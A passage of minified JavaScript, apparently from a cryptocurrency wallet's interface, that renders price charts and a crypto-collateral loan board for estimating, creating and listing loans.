                        color: "#55b64e"
                    }]
                }
            }
        }
          , getZoomChartOptions = (e, t, a) => {
            const n = getOpenValue(e)
              , {chartPointsForZoom: r} = handleChartData(e, n, t);
            return {
                animation: !1,
                height: 60,
                axisPointer: {
                    triggerOn: "none"
                },
                z: 200,
                grid: {
                    height: "26%",
                    left: 23,
                    width: (0,
                    M.d)() ? "95%" : "92%",
                    z: 200
                },
                itemStyle: {
                    borderRadius: 3
                },
                xAxis: {
                    type: "time",
                    show: !1
                },
                yAxis: {
                    splitNumber: 2,
                    show: !1,
                    min: e => +(0,
                    Ko.h9)(e.min, (0,
                    Ko.$q)(e.min, .02)),
                    max: e => e.max
                },
                series: [{
                    name: "ZoomChart",
                    type: "bar",
                    data: r,
                    barGap: "2%",
                    barWidth: 2,
                    itemStyle: {
                        color: a ? "rgba(131, 132, 132, 1)" : "rgba(69, 90, 100, 0.25)",
                        opacity: 1
                    }
                }]
            }
        }
          , useNewChartData = e => {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(null)
              , [r,l] = (0,
            O.useState)(null)
              , [s,i] = (0,
            O.useState)(!1)
              , o = (0,
            O.useRef)()
              , {localCurrency: c} = local_currency_useLocalCurrency()
              , {currency: u, family: d, smartContract: m, period: p, actualRate: f, selectedFiat: E, isPreciseData: h} = e;
            (0,
            O.useEffect)((function onFetchChartData() {
                i(!0);
                async function fetch() {
                    i(!0);
                    const e = await t(fetch_full_histo_fetchFullHisto((0,
                    be.xG)(u), p, E, f, h));
                    n(null == e ? void 0 : e.resultData);
                    l(null == e ? void 0 : e.oneMonthDataResult);
                    i(!1)
                }
                o.current && clearTimeout(o.current);
                o.current = setTimeout(( () => {
                    fetch()
                }
                ), 1e3);
                return () => {
                    o.current && clearTimeout(null == o ? void 0 : o.current)
                }
            }
            ), [u, d, m, p, f, c, t, E, h]);
            return {
                chartData: a,
                isLoading: s,
                oneMonthData: r
            }
        }
        ;
        var i8 = a(70012)
          , o8 = a(68023)
          , c8 = a(81615)
          , u8 = a(54377)
          , d8 = a(41969)
          , m8 = a(31281)
          , p8 = a(68712)
          , f8 = a(34584)
          , E8 = a(17813);
        (0,
        o8.D)([u8.N, d8.N, m8.N, p8.N, f8.N, i8.N, E8.N]);
        function MainChart(e) {
            let {isSmallChart: t, isCurrentZoom: a} = e;
            const {state: n, dispatch: r} = useEChartContext()
              , {mainChartOptions: l} = n.chartOptions
              , {chartData: s, zoomState: i} = n.currentChartValues
              , {decimals: o} = n
              , c = (0,
            O.useRef)(null)
              , u = (0,
            $.v9)(Ot)
              , d = getChartWidth(t)
              , m = getChartHeight(t)
              , p = getChartMargin(t)
              , f = getChartPadding()
              , E = {
                zoomStart: 0,
                zoomEnd: 100
            };
            (0,
            O.useEffect)((function onChartInit() {
                var e, t, a;
                let n;
                null !== c.current && (n = (0,
                c8.S1)(c.current, void 0, {
                    renderer: "svg"
                }));
                function resizeChart() {
                    var e;
                    null === (e = n) || void 0 === e || e.resize()
                }
                window.addEventListener("resize", resizeChart);
                null === (e = n) || void 0 === e || e.getZr().on("mousemove", (function(e) {
                    var t, a, l, s, i;
                    if ("inside" === (null == e || null === (t = e.target) || void 0 === t || null === (a = t.textConfig) || void 0 === a ? void 0 : a.position)) {
                        var o;
                        null === (o = n) || void 0 === o || o.getZr().setCursorStyle("move")
                    }
                    if ("pointer" === (null == e || null === (l = e.target) || void 0 === l ? void 0 : l.cursor)) {
                        var c;
                        null === (c = n) || void 0 === c || c.getZr().setCursorStyle("default")
                    }
                    const u = [e.offsetX, e.offsetY]
                      , d = undefined;
                    (null === (s = n) || void 0 === s ? void 0 : s.convertFromPixel("grid", u)) && (null !== (i = n) && void 0 !== i && i.containPixel("grid", u) || r({
                        type: T6.SET_LAST_VALUE_AS_CURRENT
                    }))
                }
                ));
                null === (t = n) || void 0 === t || t.on("highlight", (e => {
                    var t, a;
                    const l = undefined
                      , s = (null === (t = n) || void 0 === t ? void 0 : t.getOption()).series[0].data
                      , i = e.batch[0].dataIndex
                      , c = o ? (0,
                    Ko.FH)(+s[i].value[1], {
                        min: o,
                        max: o
                    }) : s[i].value[1].toString();
                    r({
                        type: T6.SET_CURRENT_CHART_VALUES,
                        payload: {
                            currentSelectedValue: c
                        }
                    });
                    null === (a = n) || void 0 === a || a.getZr().setCursorStyle("default")
                }
                ));
                null === (a = n) || void 0 === a || a.on("datazoom", (e => {
                    var t;
                    E.zoomStart = e.start;
                    E.zoomEnd = e.end;
                    const a = null === (t = n) || void 0 === t ? void 0 : t.getOption();
                    if (s) {
                        const e = handleZoomedChartSeries(s, a, E.zoomStart, E.zoomEnd);
                        r({
                            type: T6.SET_CHART_OPTIONS,
                            payload: {
                                mainChartOptions: e
                            }
                        })
                    }
                }
                ));
                return () => {
                    var e;
                    null === (e = n) || void 0 === e || e.dispose();
                    window.removeEventListener("resize", resizeChart)
                }
            }
            ), [u, r, o, s]);
            (0,
            O.useEffect)((function onSetZoomState() {
                r({
                    type: T6.SET_CURRENT_CHART_VALUES,
                    payload: {
                        zoomState: E
                    }
                })
            }
            ), [s]);
            (0,
            O.useEffect)((function onOptionChange() {
                if (null !== c.current && l) {
                    const e = (0,
                    c8.JE)(c.current);
                    if (a && i && l) {
                        l.dataZoom[0].start = i.zoomStart;
                        l.dataZoom[0].end = i.zoomEnd;
                        null == e || e.setOption(l);
                        return
                    }
                    null == e || e.setOption(l)
                }
            }
            ), [l]);
            return O.createElement("div", {
                ref: c,
                style: {
                    width: d,
                    height: m,
                    zIndex: 100,
                    margin: p,
                    padding: f
                }
            })
        }
        var h8 = a(39920);
        const useSpringTransition = e => (0,
        h8.useTransition)(e, {
            from: {
                opacity: 0
            },
            enter: {
                opacity: 1
            },
            leave: {
                opacity: 0
            },
            delay: 100,
            config: h8.config.molasses
        });
        var g8 = a(32586);
        (0,
        o8.D)([g8.N, m8.N, i8.N]);
        function ZoomChart() {
            const e = (0,
            O.useRef)(null)
              , {state: t} = useEChartContext()
              , {zoomChartOptions: a} = t.chartOptions;
            (0,
            O.useEffect)((function onChartInit() {
                let t;
                null !== e.current && (t = (0,
                c8.S1)(e.current, void 0));
                function resizeChart() {
                    var e;
                    null === (e = t) || void 0 === e || e.resize()
                }
                window.addEventListener("resize", resizeChart);
                return () => {
                    var e;
                    null === (e = t) || void 0 === e || e.dispose();
                    window.removeEventListener("resize", resizeChart)
                }
            }
            ), []);
            (0,
            O.useEffect)((function onOptionChange() {
                if (null !== e.current && a) {
                    const t = (0,
                    c8.JE)(e.current);
                    null == t || t.setOption(a)
                }
            }
            ), [a]);
            return O.createElement("div", {
                ref: e,
                style: {
                    width: (0,
                    M.d)() ? "100%" : "725px",
                    height: "200px",
                    marginTop: (0,
                    M.d)() ? "-160px" : "-129px",
                    marginLeft: (0,
                    M.d)() ? "0" : "-21px",
                    padding: (0,
                    M.d)() ? "0 20px 0 15px" : ""
                }
            })
        }
        function EChart(e) {
            let {wallet: t, walletChartData: a, isSmallChart: n, isFiatNotSupported: r, selectedFiat: l} = e;
            const {state: s, dispatch: i} = useEChartContext()
              , {currentSelectedValue: o, currentDiffPercent: c, periodDescription: u} = s.currentChartValues
              , {period: d, isWalletChanged: m} = s;
            (0,
            O.useEffect)((function onSetIsWalletChange() {
                i({
                    type: T6.SET_IS_WALLET_CHANGED,
                    payload: !0
                })
            }
            ), [t, i]);
            const {convertToFiat: p} = useConverter()
              , f = (0,
            $.v9)(Ot)
              , E = p(1, t, l)
              , {currency: h, family: g, smartContract: y} = t || a || {}
              , {chartData: v, isLoading: _, oneMonthData: w} = useNewChartData({
                currency: h || "",
                family: g || "",
                smartContract: y || "",
                period: d,
                actualRate: E,
                isPreciseData: !0,
                selectedFiat: l
            })
              , b = Boolean(v) && Boolean(null == v ? void 0 : v.length) || _
              , k = (0,
            M.d)() && Boolean(a);
            (0,
            O.useEffect)((function onSetChartData() {
                if (v && w && v.length > 0 && !_) {
                    const {decimals: e} = getCurrentChartData(w)
                      , {currentValue: t, openValue: a} = getCurrentChartData(v, e)
                      , r = getMainChartOptions(v, d, "dark" === f, n)
                      , l = getZoomChartOptions(v, d, "dark" === f)
                      , s = getCurrentDiff({
                        firstValue: a,
                        currentValue: t
                    });
                    i({
                        type: T6.SET_CHART_DATA,
                        payload: {
                            chartOptions: {
                                mainChartOptions: r,
                                zoomChartOptions: l
                            },
                            chartValues: {
                                chartData: v,
                                currentSelectedValue: t,
                                currentSelectedDate: null,
                                currentDiffPercent: s,
                                periodDescription: getCurrentPeriodDesc(d),
                                lastValue: t
                            }
                        }
                    });
                    i({
                        type: T6.SET_DECIMALS,
                        payload: e
                    })
                }
            }
            ), [v, w, f, _, b, t, i]);
            const changePeriodHandler = e => {
                i({
                    type: T6.SET_PERIOD,
                    payload: e
                });
                i({
                    type: T6.SET_IS_WALLET_CHANGED,
                    payload: !1
                })
            }
              , S = null == c ? void 0 : c.includes("-")
              , C = !_ && !b || !h || r
              , N = useSpringTransition(!_);
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(x6, L6, {
                    [I6]: n,
                    [P6]: k
                })
            }, O.createElement(l8(), {
                color: "#7190EB",
                loading: _,
                cssOverride: {
                    position: "absolute",
                    margin: "auto",
                    left: 10,
                    right: 0,
                    top: 0,
                    bottom: 0
                }
            }), !n && _ && m && O.createElement("div", {
                className: Ht()(J6)
            }), O.createElement("div", {
                className: Ht()(F6, {
                    [n8]: _ && m
                })
            }, _ && m || C ? O.createElement(Loading, {
                currency: h,
                isWalletChanged: m,
                isVisible: !0,
                hasData: !C,
                period: d,
                isSmallChart: n
            }) : O.createElement(O.Fragment, null, O.createElement("div", {
                className: G6
            }, O.createElement("div", null, O.createElement("h4", {
                className: Ht()(V6, {
                    [H6]: _,
                    [K6]: _
                })
            }, !_ && O.createElement(fiat_estimate_FiatEstimate, {
                value: null == o ? void 0 : o.toString(),
                renderCurrency: !0,
                walletCurrency: h,
                withIcon: !0,
                isEChart: !0,
                full: !0,
                selectedFiat: l
            })), O.createElement("div", {
                className: Ht()(z6, {
                    [j6]: _,
                    [K6]: _
                })
            }, !_ && O.createElement(O.Fragment, null, O.createElement("span", {
                className: Ht()($6, {
                    [Z6]: S,
                    [Y6]: !S
                })
            }, c, "%"), O.createElement("span", {
                className: q6
            }, u)))), O.createElement("div", null, O.createElement("div", {
                className: D6
            }, getCurrencyTitle(h)), O.createElement("div", {
                className: Ht()(W6, {
                    [B6]: n
                })
            }, O.createElement("div", {
                onClick: () => {
                    changePeriodHandler(1)
                }
                ,
                className: Ht()({
                    [U6]: 1 === d
                })
            }, "1D"), O.createElement("div", {
                onClick: () => {
                    changePeriodHandler(7)
                }
                ,
                className: Ht()({
                    [U6]: 7 === d
                })
            }, "1W"), O.createElement("div", {
                onClick: () => {
                    changePeriodHandler(H9)
                }
                ,
                className: Ht()({
                    [U6]: d === H9
                })
            }, "1M"), O.createElement("div", {
                onClick: () => {
                    changePeriodHandler(z9)
                }
                ,
                className: Ht()({
                    [U6]: d === z9
                })
            }, "6M"), O.createElement("div", {
                onClick: () => {
                    changePeriodHandler(j9)
                }
                ,
                className: Ht()({
                    [U6]: d === j9
                })
            }, "1Y")))), _ ? O.createElement("div", {
                className: n8
            }, O.createElement(MainChart, {
                isCurrentZoom: !0,
                isSmallChart: n
            }), "️", !n && O.createElement(ZoomChart, null)) : O.createElement(O.Fragment, null, N(( (e, t) => t && O.createElement(h8.animated.div, {
                style: e
            }, O.createElement(MainChart, {
                isSmallChart: n
            }), "️", !n && O.createElement(ZoomChart, null)))))))))
        }
        const y8 = "UserLoans_loanHeader_gob07"
          , v8 = "UserLoans_searchLoanInput_1o4tb"
          , _8 = "UserLoans_iconSearch_2puPR"
          , w8 = "UserLoans_userLoans_38yx2"
          , b8 = "UserLoans_priceDownTD_1DkY2"
          , k8 = "UserLoans_arpTD_osFjz"
          , S8 = "UserLoans_statusTD_3yPlo"
          , C8 = "UserLoans_loansNotFound_3vJuj";
        var N8 = a(8571)
          , T8 = a.n(N8);
        function getBorrowHumanStatus(e) {
            return "new" === e ? "New" : "confirmed" === e ? "Pending" : "deposit_received" === e || "transaction_sent" === e ? "Processing" : "order_created" === e || "loan_success" === e || "order_created" === e ? "Active" : "liquidated" === e ? "Liquidated" : "pledge_redeemed" === e || "pledge_transaction_sent" === e ? "Processing" : "closed" === e ? "Closed" : "loan_failed" === e ? "Failed" : e
        }
        const A8 = "LoanItem_tableWrapperCurrency_3l-Ef"
          , x8 = "LoanItem_tableCurrency_2rjmg"
          , LoanItem = e => {
            var t, a, n, r, l;
            let {loan: s, loanCurrencies: i} = e;
            const o = (0,
            j.k6)()
              , c = (null == i || null === (t = i.loans) || void 0 === t || null === (a = t.find((e => (0,
            y3.Z)(e.currency) === (0,
            y3.Z)(s.loan.currency)))) || void 0 === a ? void 0 : a.decimal_places) || 8
              , u = (null == i || null === (n = i.deposit) || void 0 === n || null === (r = n.find((e => (0,
            y3.Z)(e.currency) === (0,
            y3.Z)(s.increase.currency)))) || void 0 === r ? void 0 : r.decimal_places) || 8;
            function handleViewLoan(e) {
                return function onView() {
                    o.push((0,
                    M.RU)(`/borrow/view/${e}`))
                }
            }
            const d = (0,
            y3.Z)(null == s || null === (l = s.loan) || void 0 === l ? void 0 : l.currency);
            return O.createElement("tr", {
                onClick: handleViewLoan(s.loan_id)
            }, O.createElement("td", null, O.createElement("div", {
                className: A8
            }, O.createElement(IconCurrency, {
                currency: d,
                className: x8
            }), O.createElement("span", null, (0,
            Ko.FH)(s.loan.amount || s.loan.expected_amount || 0, {
                max: c
            }), " ", d.toUpperCase()))), O.createElement("td", null, getBorrowHumanStatus(s.status)), O.createElement("td", null, date_format(s.created_at, "mmm dd, yyyy, hh:MMtt")), O.createElement("td", null, (0,
            Ko.FH)(s.deposit.amount, {
                max: u
            }) || s.deposit.expected_amount, " ", s.deposit.currency), O.createElement("td", null, (0,
            Ko.FH)(s.liquidation_price, {
                max: u
            }), " ", s.increase.currency, "/", d.toUpperCase()), O.createElement("td", null, s.interest_percent, "%"))
        }
          , UserLoans_UserLoans = e => {
            let {sortedFilteredUserLoans: t, filteredUserLoans: a, onChange: n, value: r, loanCurrencies: l, isLoading: s} = e;
            return O.createElement("div", {
                className: "col-xs-12"
            }, O.createElement("div", {
                className: Ht()(X5.borrowWhiteContainer, y8)
            }, O.createElement("h1", null, "Your Loans ", s && O.createElement(LoaderDots, {
                visible: !0
            })), !s && O.createElement(O.Fragment, null, O.createElement("div", {
                className: v8
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: T8()
                },
                className: _8
            }), O.createElement("input", {
                placeholder: "Search by currency name",
                onChange: n,
                value: r
            })), O.createElement("table", {
                className: w8
            }, O.createElement("thead", null, O.createElement("tr", null, O.createElement("td", null, "loan amount"), O.createElement("td", {
                className: S8
            }, "Status"), O.createElement("td", null, "Date & time"), O.createElement("td", null, "Collateral"), O.createElement("td", {
                className: b8
            }, "Price down limit"), O.createElement("td", {
                className: k8
            }, "Apr"))), O.createElement("tbody", null, t.map((e => O.createElement(LoanItem, {
                loanCurrencies: l,
                loan: e,
                key: e.loan_id
            }))))), 0 === a.length && O.createElement("div", {
                className: C8
            }, "Loans not found"))))
        }
          , I8 = {
            interestRatePrices: "InterestRates_interestRatePrices_1PCfq",
            currency: "InterestRates_currency_3z4Ri",
            interestRateChart: "InterestRates_interestRateChart_3lY09",
            smallBar: "InterestRates_smallBar_BvTep",
            smallBarFee: "InterestRates_smallBarFee_16Sz0",
            mediumBar: "InterestRates_mediumBar_13Ajg",
            bigBar: "InterestRates_bigBar_18X9m",
            additionalFee: "InterestRates_additionalFee_2g78r",
            interestPercent: "InterestRates_interestPercent_8gs9v"
        }
          , InterestRates_InterestRates = e => {
            let {currency: t, estimate: a, additionalFee: n} = e;
            if (!a || null == a || !a.interest_amounts)
                return null;
            const r = (0,
            be.xG)(t)
              , l = (0,
            Ko.yF)(7 * Number(a.interest_amounts.day), s6)
              , s = (0,
            Ko.yF)(null == a ? void 0 : a.interest_amounts.month, s6)
              , i = (0,
            Ko.yF)(null == a ? void 0 : a.interest_amounts.year, s6);
            return O.createElement("div", {
                className: I8.interestRate
            }, O.createElement("div", {
                className: I8.interestRatePrices
            }, O.createElement("div", null, O.createElement("p", null, "Week Interest:"), O.createElement("h4", null, l, " ", O.createElement("span", null, r), " ", O.createElement("span", {
                className: I8.additionalFee
            }, n ? `+${(0,
            Ko.yF)(n)} ${r}` : "", " "), O.createElement("span", null, "Fee for loans < 30 days"))), O.createElement("div", null, O.createElement("p", null, "Month Interest:"), O.createElement("h4", null, s, " ", O.createElement("span", null, r))), O.createElement("div", null, O.createElement("p", null, "Annual Interest:"), O.createElement("h4", null, i, " ", O.createElement("span", null, r)))))
        }
          , BorrowBoardIndex = () => {
            var e, t, a, n, r, l;
            const s = (0,
            $.I0)()
              , i = (0,
            $.v9)(C3)
              , o = (0,
            $.v9)(A3)
              , c = (0,
            $.v9)(N3)
              , u = (0,
            $.v9)(T3)
              , d = (0,
            $.v9)(tu)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(null)
              , [h,g] = (0,
            O.useState)(!1)
              , [y,v] = (0,
            O.useState)(!1)
              , [_,w] = (0,
            O.useState)(!1)
              , [b,k] = (0,
            O.useState)(!1)
              , [S,C] = (0,
            O.useState)(5)
              , [N,T] = (0,
            O.useState)(!1)
              , [A,x] = (0,
            O.useState)({})
              , [I,P] = (0,
            O.useState)(null)
              , [L,F] = (0,
            O.useState)(!1)
              , W = (0,
            O.useRef)()
              , R = (0,
            O.useRef)()
              , B = (0,
            O.useRef)()
              , [D,M] = (0,
            O.useState)("0.5")
              , U = (0,
            $.v9)(Yc)
              , G = (0,
            $.v9)(x3)
              , V = (0,
            $.v9)(Bo)
              , K = (0,
            O.useCallback)((e => onCustomFilterWallets(e, [""], {
                borrowLoansCurrencies: G.deposit
            })), [G.deposit])
              , H = (0,
            O.useCallback)((e => onCustomFilterWallets(e, [""], {
                borrowLoansCurrencies: G.loans
            })), [G.loans]);
            function handleSearch(e) {
                p(e.target.value)
            }
            function checkSearch(e) {
                var t;
                if (!m)
                    return !0;
                const a = m.toLowerCase();
                return !!e.deposit.currency.toLowerCase().includes(a) || BorrowPage_utils_patchBorrowCurrency((null == e || null === (t = e.loan) || void 0 === t ? void 0 : t.currency) || "").toLowerCase().includes(a)
            }
            const z = u.filter(checkSearch)
              , j = z.sort(( (e, t) => +new Date(t.created_at) - +new Date(e.created_at)))
              , [Z,Y] = (0,
            O.useState)("0")
              , {newTokens: q, newCoins: X} = useWalletsToBorrow()
              , Q = useWalletsBorrow(U, G)
              , {convertToFiat: J, convertToCrypto: ee} = useConverter()
              , te = (0,
            O.useCallback)((e => {
                var t;
                return !(null == G || null === (t = G.loans) || void 0 === t || !t.find((t => {
                    "trx" === t.network && "usdttrc20" === t.currency && (t.currency = "usdt");
                    return (0,
                    Ho.t)(t.network) === (0,
                    Ho.t)(e.family) && (0,
                    Ho.t)(e.currency) === (0,
                    Ho.t)(t.currency)
                }
                )))
            }
            ), [null == G ? void 0 : G.loans])
              , ae = (0,
            $.v9)(eu)
              , {createNewCoinOrToken: ne} = useCreateWalletAndGoTo({
                noDownloadBackup: !0
            })
              , [re,le] = (0,
            O.useState)(null)
              , [se,ie] = (0,
            O.useState)(null)
              , setWalletTo = async e => {
                const t = undefined;
                if (null == U ? void 0 : U.some((t => t.uuid === (null == e ? void 0 : e.uuid)))) {
                    ie(e);
                    return
                }
                let a = null;
                const n = ae(e.parentUuid);
                if (null != e && e.isFakeToken && n) {
                    var r;
                    const t = null == n || null === (r = n.subWallets) || void 0 === r ? void 0 : r.find((t => t.uuid === e.uuid));
                    a = await ne({
                        wallet: e,
                        isNewToken: !Boolean(t),
                        isNewWallet: !1,
                        parentWallet: n
                    })
                } else if (!Boolean(e.address) && null != e && e.isFakeToken && (e.ticker || e.currency) !== e.family) {
                    const t = await ne({
                        wallet: {
                            currency: e.family
                        },
                        isNewWallet: !0,
                        parentWallet: null
                    });
                    a = await ne({
                        wallet: e,
                        isNewToken: !0,
                        isNewWallet: !1,
                        parentWallet: t
                    })
                } else
                    Boolean(e.address) || (a = await ne({
                        wallet: e,
                        isNewWallet: !0,
                        parentWallet: null
                    }));
                ie(a || e)
            }
              , {localCurrency: oe} = local_currency_useLocalCurrency()
              , [ce] = use_fee(null != re ? re : void 0, null != re ? re : void 0, Z)
              , [ue] = fee_wallet(null != re ? re : void 0)
              , de = (0,
            O.useMemo)(( () => (0,
            Ko.FH)(J((null == f ? void 0 : f.amount_to) || 0, se, "usd"), {
                max: 4
            })), [f, se, J])
              , me = (0,
            O.useMemo)(( () => (0,
            Ko.FH)(J(Z || 0, re, "usd"), {
                max: 4
            })), [Z, re, J])
              , pe = {
                currencyFrom: null == re ? void 0 : re.currency,
                currencyTo: null == se ? void 0 : se.currency,
                amount: (0,
                Ko.yF)(null == f ? void 0 : f.amount_to),
                amountInUsd: (0,
                Ko.yF)(de),
                collateralAmount: (0,
                Ko.yF)(Z),
                collateralAmountInUsd: (0,
                Ko.yF)(me)
            };
            (0,
            O.useEffect)(( () => {
                var e, t;
                const a = null == G || null === (e = G.deposit) || void 0 === e ? void 0 : e.find((e => (0,
                Ho.t)(e.currency) === (0,
                Ho.t)(null == re ? void 0 : re.currency)))
                  , n = null == G || null === (t = G.loans) || void 0 === t ? void 0 : t.find((e => (0,
                Ho.t)(e.currency) === (0,
                Ho.t)(null == se ? void 0 : se.currency)));
                a && n ? P(Number(n.additional_fees) + Number(a.additional_fees)) : a && P(a.additional_fees)
            }
            ), [null == G ? void 0 : G.deposit, re, null == G ? void 0 : G.loans, se]);
            const handleChangeValueFrom = e => {
                !e || e.match(/^\d+\.0*$/) ? Y(e) : Y((0,
                Ko.y4)(e));
                k(!0)
            }
              , handleChangeWalletFrom = e => {
                le(e);
                k(!1)
            }
              , fe = useMinimalAmountInCrypto({
                loanCurrencies: G,
                walletFrom: re,
                walletTo: se,
                convertToCrypto: ee,
                convertToFiat: J
            });
            (0,
            O.useEffect)(( () => {
                if (re && fe) {
                    Y(fe ? (0,
                    Ko.FH)(fe, a6) : re.balance || "5");
                    k(!1)
                }
            }
            ), [re, fe]);
            (0,
            O.useEffect)(( () => {
                const e = U.filter(K)
                  , t = e.find((e => "xrp" === e.currency))
                  , a = Q.reduce(( (e, t) => e.concat(t.subWallets.filter(te))), [])
                  , n = a.find((e => "trx" === e.family && "usdt" === e.currency));
                !re && t && le(t);
                re || t || !e[0] || le(e[0]);
                !se && n && setWalletTo(n);
                se || n || !a[0] || setWalletTo(a[0])
            }
            ), [U, Q, G, re, se, te]);
            useUpdateEffect(( () => {
                if (L && d) {
                    const e = Q.find((e => e.currency === d.currency));
                    if (null != e && e.subWallets.length) {
                        setWalletTo(e.subWallets[0]);
                        return
                    }
                }
                !L && d && le(d)
            }
            ), [null == d ? void 0 : d.uuid]);
            (0,
            O.useEffect)(( () => {
                if (!0 === V)
                    return;
                clearTimeout(R.current);
                let e = !1;
                R.current = window.setTimeout((async () => {
                    if (e)
                        return;
                    if (!re || !se)
                        return;
                    const t = await s(estimateLoanAmount({
                        codeFrom: patchBorrowWalletCurrencyForApi(re),
                        codeTo: patchBorrowWalletCurrencyForApi(se),
                        to_network: se.family || se.currency,
                        from_network: re.family || re.currency,
                        amount: String(Z),
                        ltvPercent: D
                    }));
                    if (!e)
                        if (!("result"in t) || t.result) {
                            g(!1);
                            E(t)
                        } else {
                            ge.b.error(ge.d.LOAN_GET_ESTIMATE_ERROR, pe);
                            k(!0);
                            const e = getBorrowBoardError(t.message, fe);
                            g(e)
                        }
                }
                ), 100);
                return () => {
                    clearTimeout(R.current);
                    e = !0
                }
            }
            ), [re, se, Z, fe, s, D, V]);
            const Ee = (0,
            O.useCallback)((async () => {
                if (!(se && re && Z && ue && ce))
                    return;
                v(!0);
                const e = await s(createUserLoan({
                    loan: {
                        currency_code: se && patchBorrowWalletCurrencyForApi(se),
                        currency_network: (null == se ? void 0 : se.family) || (null == se ? void 0 : se.currency)
                    },
                    deposit: {
                        currency_code: null == re ? void 0 : re.currency,
                        currency_network: (null == re ? void 0 : re.family) || (null == re ? void 0 : re.currency),
                        expected_amount: Z
                    },
                    ltv_percent: D,
                    referral: ""
                }));
                if ("status"in e && (null == e || !e.status) || !e || !("loan_id"in e)) {
                    v(!1);
                    g("Failed create loan");
                    console.error("Failed create loan");
                    ge.b.error(ge.d.FAILED_LOAN, pe);
                    return
                }
                const t = await s(fetchLoanById(e.loan_id))
                  , a = await s(confirmCreateLoan(t, se.address));
                if ("status"in a && !a.status || !("address"in a)) {
                    v(!1);
                    ge.b.error(ge.d.FAILED_LOAN, pe);
                    g("Failed create loan");
                    console.error("Failed create confirm loan");
                    return
                }
                const n = {
                    currency: null == re ? void 0 : re.currency,
                    address: a.address
                };
                try {
                    const t = await tM.send("send", re, n, ue, {
                        amount: (0,
                        Ko.PD)(Z, ce).toString(),
                        isFeeIncluded: !1,
                        extraId: a.extraId,
                        fee: ce
                    });
                    if (t.error) {
                        var r;
                        cc.$.send(cc.d.BORROW_LOAN_CREATE_ERROR);
                        ge.b.error(ge.d.FAILED_LOAN, pe);
                        g((null === (r = t.error) || void 0 === r ? void 0 : r.text) || t.error);
                        v(!1);
                        await s(cancelUserLoan(e.loan_id));
                        return
                    }
                    if (t.hash) {
                        cc.$.send(cc.d.BORROW_LOAN_CREATE_DONE);
                        ge.b.success(ge.d.LOAN_SUCCESS, pe);
                        x({
                            currencyFrom: null == re ? void 0 : re.currency,
                            amountFrom: Z,
                            currencyTo: null == se ? void 0 : se.currency,
                            amountTo: String(null == f ? void 0 : f.amount_to)
                        });
                        T(!0)
                    }
                } catch (t) {
                    cc.$.send(cc.d.BORROW_LOAN_CREATE_ERROR);
                    ge.b.error(ge.d.FAILED_LOAN, pe);
                    await s(cancelUserLoan(e.loan_id));
                    g(t.message)
                }
                await s(fetchUserLoans());
                v(!1)
            }
            ), [s, null == f ? void 0 : f.amount_to, ce, ue, Z, re, null == re ? void 0 : re.address, null == se ? void 0 : se.address, null == se ? void 0 : se.currency, D]);
            async function handleCreateLoan() {
                var e, t;
                if (!c)
                    return;
                cc.$.send(cc.d.BORROW_LOAN_CREATE_START);
                const {isValid: a} = null !== (e = null === (t = B.current) || void 0 === t ? void 0 : t.validate()) && void 0 !== e ? e : {};
                if (a) {
                    w(!0);
                    W.current = window.setInterval(( () => {
                        C((e => e - 1))
                    }
                    ), 1e3)
                } else {
                    cc.$.send(cc.d.BORROW_LOAN_CREATE_VALIDATION_FAILED);
                    k(!0);
                    setTimeout(( () => k(!1)), 3e3)
                }
            }
            function handleUndoExecution() {
                cc.$.send(cc.d.BORROW_LOAN_UNDO);
                clearInterval(W.current);
                w(!1);
                C(5)
            }
            function handleSetMinAmount() {
                fe && Y((0,
                Ko.FH)(fe, a6));
                k(!0)
            }
            function handleSetAllAmount() {
                Y((0,
                Ko.FH)((0,
                Ko.h9)(null == re ? void 0 : re.balance, ce), a6));
                k(!0)
            }
            (0,
            O.useEffect)(( () => {
                if (!0 !== V && 0 === S) {
                    handleUndoExecution();
                    Ee()
                }
            }
            ), [Ee, S, V]);
            const [he] = usePrecision(null != re ? re : void 0)
              , ye = null != ce
              , ve = (0,
            O.useMemo)(( () => {
                const e = getMaxDefaultLoanValue(G, re);
                return e || (0,
                Ko.h9)(null == re ? void 0 : re.balance, ce)
            }
            ), [null == re ? void 0 : re.currency, Z])
              , _e = {
                available: (null == re ? void 0 : re.balance) || "0",
                min: (0,
                Ko.FH)(fe, a6),
                max: (0,
                Ko.FH)(ve, a6),
                precision: he
            }
              , we = "The period from taking a loan to paying off the debt is unlimited. You can close the loan at any time."
              , ke = "Interest rate is accrued monthly from the moment of getting the loan and is paid at the time of closing the loan."
              , Se = "The market price of the collateral currency at which your collateral will be automatically sold."
              , Ce = "Charged when the loan is repaid within 30 days. If you pay off the loan after 31 days, no additional fees will be charged."
              , Ne = (null === (e = Q[0]) || void 0 === e ? void 0 : e.subWallets.length) > 0
              , Te = !h && !y && f && G && re
              , Ae = {
                currency: (null == re || null === (t = re.currency) || void 0 === t ? void 0 : t.toLowerCase()) || "",
                family: (null == re || null === (a = re.family) || void 0 === a ? void 0 : a.toLowerCase()) || (null == re || null === (n = re.currency) || void 0 === n ? void 0 : n.toLowerCase()) || "",
                smartContract: (null == re || null === (r = re.smartContract) || void 0 === r ? void 0 : r.toLowerCase()) || ""
            };
            return O.createElement(sf(), {
                ref: B
            }, O.createElement(PopupLoanSuccess, {
                visible: N,
                onClose: () => T(!1),
                data: A
            }), O.createElement("div", {
                className: "col-xs-7 electron-left-column-new"
            }, O.createElement("div", {
                className: Ht()(X5.borrowBorderContainer, X5.firstBlock, Q5.loanHeader)
            }, O.createElement("h1", null, "Loan Crypto"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: Z,
                rules: zf.amount(_e)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isNewDesign: !0,
                    message: a,
                    isInvalid: !t && (b || (null == a ? void 0 : a.includes("Reduce the number (max"))),
                    className: Q5.errorInput,
                    withOverflow: !0,
                    top: -27,
                    right: 32,
                    handleChangeAmount: handleChangeValueFrom,
                    minValue: fe,
                    maxValue: ve
                }, O.createElement(InputValueAndSelect_InputValueAndSelect, {
                    title: "Collateral amount",
                    onChange: handleChangeValueFrom,
                    value: Z,
                    disabled: y || _,
                    isInvalid: !t && b,
                    fiat: re ? re.currency : void 0,
                    isSelectorWithValue: !0,
                    customWrapper: Q5.inputWrapper,
                    customWrapperCurrencies: Q5.customWrapperCurrencies
                }, O.createElement("div", {
